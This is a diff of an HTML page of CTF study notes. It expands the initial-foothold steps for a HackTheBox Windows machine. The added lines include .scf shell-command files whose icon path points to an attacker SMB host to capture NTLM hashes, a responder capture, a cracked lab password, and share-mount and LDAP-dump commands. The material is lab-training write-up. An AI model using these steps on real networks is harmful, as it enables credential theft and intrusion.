@@ -2975,11 +2975,17 @@
                         <span class="step_title">Initial_Foothold</span>
                         <br>`smbmap -H 10.10.10.103 -u anonymous -R` 
                         <br>if we upload some file to /Users/Public it will get deleted timely
-                        <br>upload a test.scf file with following content: 
+                        <br>upload a .scf(Windows Explorer Shell Command files) file so that when user open the share we can get hash
+                        <br>=====0xdf.scf=====
                         <br>[Shell]
                         <br>Command=2
                         <br>IconFile=\\10.10.14.4\icon
-                        <br>note: .scf = Windows Explorer Shell Command files
+                        <br>=====ippsec.scf=====
+                        <br>[Shell]
+                        <br>Command=2
+                        <br>IconFile=\\10.10.14.3\share\pwn.ico
+                        <br>[Taskbar]
+                        <br>Command=ToggleDesktop
                         <br>`responder -I tun0` got hash, crack got cred amanda:Ashare1972
                         <br>`mount -t cifs -o username=amanda,password=Ashare1972 "//10.10.10.103/CertEnroll" /mnt` found cert files, save for later
                         <br>`ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ./ldap/` analize user and group
@@ -3286,7 +3292,7 @@
         <div class="dropdown">
             <button class="dropdown_button" id="provingground_play_button"></button>
             <div class="dropdown_content" id="provingground_play_content">
-                
+                <span>53 machine notes need to write</span>
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/offsec_pg_play.jpg" alt="img"> <span>machine_name (difficulty/Linux)</span> </button>
                     <div class="sub_dropdown_content">
@@ -3316,7 +3322,8 @@
         <!-- ========================provingground_practice_content======================== -->
         <div class="dropdown">
             <button class="dropdown_button" id="provingground_practice_button"></button>
-            <div class="dropdown_content" id="provingground_practice_content">                
+            <div class="dropdown_content" id="provingground_practice_content">  
+                <span>5 machine notes need to write</span>              
         
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/offsec_pg_practice.jpg" alt="img"> <span>machine_name (difficulty/Linux)</span> </button>
@@ -4043,6 +4050,7 @@
         <div class="dropdown">
             <button class="dropdown_button" id="vulnhub_button"></button>
             <div class="dropdown_content" id="vulnhub_content">
+                <span>9 machine notes need to write</span>              
                 
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/vulnhub_icon.png" alt="img"> <span>DC1</span> </button>
@@ -4149,6 +4157,7 @@
         <div class="dropdown">
             <button class="dropdown_button" id="hackthebox_challenges_button"></button>
             <div class="dropdown_content" id="hackthebox_challenges_content">
+                <span>4 ctf notes need to write</span>
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>name (catagory)</span> </button>                    
                     <div class="sub_dropdown_content">
@@ -4169,6 +4178,7 @@
         <div class="dropdown">
             <button class="dropdown_button" id="pico_ctf_button"></button>
             <div class="dropdown_content" id="pico_ctf_content">
+                <span>69 ctf notes need to write</span>
                 
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/pico_ctf_icon.png" alt="img"> <span>name (catagory)</span> </button>
